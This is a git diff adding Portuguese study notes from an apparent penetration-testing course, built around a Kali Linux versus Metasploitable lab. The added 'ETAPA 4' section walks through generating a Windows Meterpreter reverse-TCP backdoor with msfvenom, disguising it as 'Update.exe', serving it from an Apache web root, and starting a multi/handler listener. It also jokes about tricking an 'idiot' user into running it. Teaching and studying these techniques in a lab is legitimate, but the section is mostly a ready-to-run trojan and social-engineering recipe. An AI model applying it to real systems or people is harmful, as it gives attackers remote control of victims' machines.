@@ -5,6 +5,11 @@ https://www.youtube.com/watch?v=Vq_8nn70kxg&embeds_referring_origin=https%3A%2F%
 
 Aqui vamos usar o Kali, para invadir a maquina virtual com o metaexploitable
 
+
+# DESAFIO DO PROFESSOR
+https://github.com/cassiano-dio/cibersecurity-desafio-ransomware
+
+
 # Explorando Falhas FTP
 
 FTP (File Transfer Protocol) é um protocolo bem antigo (anos 70) usado para transferir arquivos entre cliente e servidor. Funciona na porta 21 (controle) e usa uma porta adicional para dados (ativo ou passivo).
@@ -102,3 +107,53 @@ https://www.youtube.com/embed/uIizaBULfq4?controls=0&disablekb=1&enablejsapi=1&f
 Comando, nos permite vizulizar as coneções que estamos conectados.
 ▶️ Sessions
 
+# ETAPA 4 - Adicionar Backdoor em um executavel
+
+https://www.youtube.com/watch?v=zDINc08S6eg&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE
+
+Mascaremos nosso Backdor em um executavel, temos varios tipos de ataques para executar quando conseguimos um backdor, monitorar todo o computador para faze-lo funcionar
+
+Usar o Meta-interpreter, é um payloader, e ele só existirar dentro da memoria e não do disco rigido 
+
+
+## Passo 1 - Ligar o Kali e o Alvo(windows)
+
+Para criar nosso executavle malicioso usaremos o msfvenom
+    Comando  -   Payload
+▶️ msfvenom -p windows/meterpreter/reverse_tcp -a x86 plataform windows -f exe LHOST=192.168.56.103 LPORT=4444 -o Update.exe
+
+🟡 O que cada parte significa
+
+🟡 msfvenom — ferramenta do Metasploit para gerar payloads (binários, shellcode, scripts).
+
+🟡-p windows/meterpreter/reverse_tcp — payload escolhido: Meterpreter para Windows que faz reverse TCP (o alvo conecta de volta ao atacante).
+
+🟡-a x86 — arquitetura do payload: x86 (32-bit). Use x64 se for 64-bit.
+
+🟡--platform windows — plataforma alvo: Windows.
+
+🟡-f exe — formato de saída: executável Windows (.exe).
+
+🟡LHOST=192.168.56.103 — IP do atacante/listener (onde o payload deve conectar). Aqui é o IP da sua máquina de lab.
+
+🟡LPORT=4444 — porta do listener que ficará aguardando a conexão (a mesma no handler).
+🟡-o Update.exe — nome do arquivo gerado (escrito no disco): Update.exe.
+
+
+Criamos um executavel maldozo ja, agora é só passar o idiota para traz, digo cliente desatento.
+
+
+    Aqui vamos iniciar um servidor para fazer a maldade.
+▶️service apache2 start
+
+▶️cp Update.exe /var/www/html
+
+Para gerar a sessão com o usuario e fazer a maldade
+Temos que ativar o 
+▶️ mfsconsole
+▶️ use multi/handler
+▶️ set payload windowns/meterpreter/reverse_tcp
+▶️ info 
+    Para o meterprecer poder escutar definimos o LHOST
+▶️ set LHOST Ip Minha maquina
+▶️ set LPORT 4444 (( Mesma porta setada no Viruz))
